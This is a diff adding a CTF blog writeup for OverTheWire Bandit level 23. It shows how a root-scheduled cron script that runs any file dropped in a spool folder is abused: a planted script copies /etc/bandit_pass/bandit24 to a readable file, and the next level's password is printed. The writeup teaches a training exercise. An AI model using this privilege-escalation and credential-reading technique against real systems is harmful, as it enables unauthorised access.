@@ -1,0 +1,102 @@
+---
+title: 'Bandit 23 Writeup'
+date: '2023-10-13'
+lastmod: '2023-10-13'
+tags: ['CTF', 'OTW']
+summary: "Bandit Level 22 is a challenge involving cron jobs"
+thumbnail: '/static/images/bandit-2023/banner.png'
+images: ['/static/images/bandit-2023/banner.png']
+authors: ['psga','maysu']
+layout: PostSimple
+hidden: true
+---
+<div className="tocr not-prose">
+    <TOCInline
+        toc={[
+            { value: 'Bandit', url: '/blog/bandit-2023', depth: 1 },
+            { value: 'Level-14', url: '/blog/bandit-2023/level-14',depth: 2},
+            { value: 'Level-15', url: '/blog/bandit-2023/level-15', depth: 2 },
+            { value: 'Level-16', url: '/blog/bandit-2023/level-16', depth: 2 },
+            { value: 'Level-17', url: '/blog/bandit-2023/level-17', depth: 2 },
+            { value: 'Level-18', url: '/blog/bandit-2023/level-18', depth: 2 },
+            { value: 'Level-19', url: '/blog/bandit-2023/level-19', depth: 2 },
+            { value: 'Level-20', url: '/blog/bandit-2023/level-20', depth: 2 },
+            { value: 'Level-21', url: '/blog/bandit-2023/level-21', depth: 2 },
+            { value: 'Level-22', url: '/blog/bandit-2023/level-22', depth: 2 },
+            { value: 'Level-23', url: '/blog/bandit-2023/level-23', depth: 2,active: true},
+            { value: 'Level-24', url: '/blog/bandit-2023/level-24', depth: 2 },
+            { value: 'Level-25', url: '/blog/bandit-2023/level-25', depth: 2 },
+            { value: 'Level-26', url: '/blog/bandit-2023/level-26', depth: 2 },
+            { value: 'Level-27', url: '/blog/bandit-2023/level-27', depth: 2 },
+            { value: 'Level-28', url: '/blog/bandit-2023/level-28', depth: 2 },
+            { value: 'Level-29', url: '/blog/bandit-2023/level-29', depth: 2 },
+            { value: 'Level-30', url: '/blog/bandit-2023/level-30', depth: 2 },
+            { value: 'Level-31', url: '/blog/bandit-2023/level-31', depth: 2 },
+            { value: 'Level-32', url: '/blog/bandit-2023/level-32', depth: 2 },
+        ]}
+        title="levels"
+        rightAlign
+    />
+</div>
+
+
+# Concepts to consider
+consider [Bandit 21 Writeup](/blog/bandit-2023/level-21)
+
+
+# bandit 23
+
+## Task 
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+
+## Solution
+lets see the file
+
+```
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+
+```
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+lets create a temp directory and a script , This script must be passed to foo
+
+```
+bandit23@bandit:/tmp/tmp.y8MUAUgn0i$ vim a.sh
+
+bandit23@bandit:/tmp/tmp.y8MUAUgn0i$ cat a.sh
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.y8MUAUgn0i/holabebecita
+chmod 444 /tmp/tmp.y8MUAUgn0i/holabebecita
+
+bandit23@bandit:/tmp/tmp.y8MUAUgn0i$ cp a.sh /var/spool/bandit24/foo/a1.sh
+```
+That script copy the password to a file readable for the actual user
+
+lets see the password
+```
+bandit23@bandit:/tmp/tmp.y8MUAUgn0i$ cat holabebecita
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
